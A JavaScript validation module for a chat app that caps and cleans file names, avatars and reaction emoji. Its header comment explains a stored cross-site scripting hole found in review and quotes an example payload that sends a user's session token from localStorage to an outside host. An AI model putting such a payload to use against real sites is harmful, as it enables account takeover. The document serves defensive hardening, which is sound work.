// ── Bounds on what a client is allowed to store ────────────────────────────
//
// Found while reviewing the app for security holes, and the reason this file
// exists rather than a one-line fix at the render site.
//
// `fileName` went from a socket payload into the database with nothing
// checking it — no length, no character rules, no type check beyond what
// SQLite would accept — and the web client then rendered it with innerHTML:
//
//     a.innerHTML = '📄 ' + (msg.file_name || 'Download file');
//
// So a message whose filename was `<img src=x onerror="fetch('https://…/'+
// localStorage.token)">` ran in the browser of everybody who opened that
// chat, and the session token is in localStorage. That is an account
// takeover, stored, triggered by reading a message.
//
// The render is fixed, and that alone closes it for this client. This is the
// other half, for three reasons worth stating:
//
//   * the app and the web are two clients and there will be more; a value
//     that cannot be stored cannot be mishandled by the next one.
//   * a filename of a megabyte is a database and a payload problem quite
//     apart from any script in it.
//   * the bound is the kind of thing that is obvious in hindsight and
//     invisible in a diff, so it lives somewhere with its reasons attached.
//
// These are LIMITS, not sanitisers. Nothing here tries to make dangerous text
// safe by rewriting it — that is a game nobody wins, and a caller that
// believes the output is safe is worse off than one that knows it is not.
// Rendering as text is what makes it safe; this only stops the absurd.

/** A filename a person might really have. Beyond this it is not a name. */
const FILE_NAME_MAX = 200;
/** An avatar is one emoji. Some are several code points, hence the room. */
const AVATAR_MAX = 8;
/** A reaction is an emoji too, with the same allowance. */
const EMOJI_MAX = 16;

/**
 * A filename as it will be stored.
 *
 * Control characters go, because a newline or a NUL in a name is never
 * anything but an attempt at confusing something downstream — a log line, a
 * header, a path. Everything else is kept as it arrived: names are people's
 * own words, frequently Persian or Kurdish here, and quietly rewriting them
 * would be its own bug.
 */
function cleanFileName(v) {
  if (v === null || v === undefined) return null;
  const s = String(v).replace(/[\u0000-\u001f\u007f]/g, '').trim();
  if (!s) return null;
  return s.length > FILE_NAME_MAX ? s.slice(0, FILE_NAME_MAX) : s;
}

/** An avatar, bounded. Same rules, shorter. */
function cleanAvatar(v) {
  if (v === null || v === undefined || v === '') return null;
  const s = String(v).replace(/[\u0000-\u001f\u007f]/g, '').trim();
  if (!s) return null;
  return s.slice(0, AVATAR_MAX);
}

/**
 * Is this acceptable as a reaction?
 *
 * Rejected rather than trimmed: a reaction is chosen from a fixed row of
 * buttons, so anything outside the bounds did not come from the app and there
 * is nothing to salvage.
 */
function validEmoji(v) {
  if (typeof v !== 'string') return false;
  if (!v || v.length > EMOJI_MAX) return false;
  // No control characters, and no angle brackets: both only appear here in
  // something that is not an emoji.
  return !/[\u0000-\u001f\u007f<>]/.test(v);
}

module.exports = {
  FILE_NAME_MAX, AVATAR_MAX, EMOJI_MAX,
  cleanFileName, cleanAvatar, validEmoji,
};
